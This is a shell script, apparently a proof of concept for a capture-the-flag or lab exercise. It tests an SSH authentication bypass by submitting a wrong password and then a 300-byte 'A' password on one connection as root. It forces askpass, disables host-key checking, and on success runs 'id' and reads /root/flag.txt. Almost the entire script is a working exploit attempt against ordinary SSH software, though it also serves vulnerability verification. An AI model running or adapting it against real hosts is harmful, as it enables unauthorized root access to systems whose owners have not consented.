#!/bin/sh
# 验证脚本：同一 TCP 连接内提交两次密码，第二次用 300 字节
# 用法：./verify.sh [host] [port] [short]
#   第三参数传 short 时改用短密码，用于对照实验
set -eu

HOST="${1:-127.0.0.1}"
PORT="${2:-2222}"
MODE="${3:-long}"

if [ "$MODE" = "short" ]; then
    PW="shortwrong"
else
    # 257-1024 字节窗口，取 300
    PW=$(head -c 300 /dev/zero | tr '\0' 'A')
fi

ASKPASS=$(mktemp)
printf '#!/bin/sh\nprintf "%%s\\n" "$MUSL_PW"\n' > "$ASKPASS"
chmod 700 "$ASKPASS"
trap 'rm -f "$ASKPASS"' EXIT

OUT=$(
    MUSL_PW="$PW" SSH_ASKPASS="$ASKPASS" SSH_ASKPASS_REQUIRE=force DISPLAY=:0 \
    setsid -w ssh -F /dev/null -p "$PORT" \
        -o ConnectTimeout=8 \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o GlobalKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        -o PasswordAuthentication=yes \
        -o PubkeyAuthentication=no \
        -o KbdInteractiveAuthentication=no \
        -o NumberOfPasswordPrompts=2 \
        -o BatchMode=no \
        "root@$HOST" 'id; cat /root/flag.txt' 2>&1
) || true

if echo "$OUT" | grep -q 'uid=0(root)'; then
    echo "[VULN] root@${HOST}:${PORT} logged in with $(echo -n "$PW" | wc -c | tr -d ' ')-byte password"
    echo "$OUT"
    exit 0
else
    echo "[SAFE] root@${HOST}:${PORT} rejected"
    echo "$OUT" | tail -n 3
    exit 1
fi
